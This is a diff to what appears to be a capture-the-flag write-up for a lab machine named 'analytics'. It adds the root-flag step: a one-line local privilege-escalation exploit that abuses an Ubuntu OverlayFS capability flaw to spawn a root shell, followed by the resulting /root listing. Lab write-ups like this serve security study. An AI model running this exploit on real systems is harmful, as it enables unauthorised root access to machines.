@@ -74,4 +74,21 @@ drwxrwxr-x 3 metalytics metalytics 4096 Aug  8  2023 .local
 ```
 
 # Root Flag
-Got spoiled with a bash with suid set in /tmp. Not continuing.
+```bash
+metalytics@analytics:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty;import os;os.setuid(0);pty.spawn("/bin/bash")'
+root@analytics:/tmp# ls -la /root
+total 48
+drwx------  6 root root 4096 Feb 16 07:42 .
+drwxr-xr-x 18 root root 4096 Aug  8  2023 ..
+lrwxrwxrwx  1 root root    9 Apr 27  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  2 root root 4096 Apr 27  2023 .cache
+drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Feb 16 07:42 root.txt
+drwxr-xr-x  2 root root 4096 Aug 25 15:14 .scripts
+-rw-r--r--  1 root root   66 Aug 25 15:14 .selected_editor
+drwx------  2 root root 4096 Apr 27  2023 .ssh
+-rw-r--r--  1 root root   39 Aug  8  2023 .vimrc
+-rw-r--r--  1 root root  165 Aug  8  2023 .wget-hsts
+```
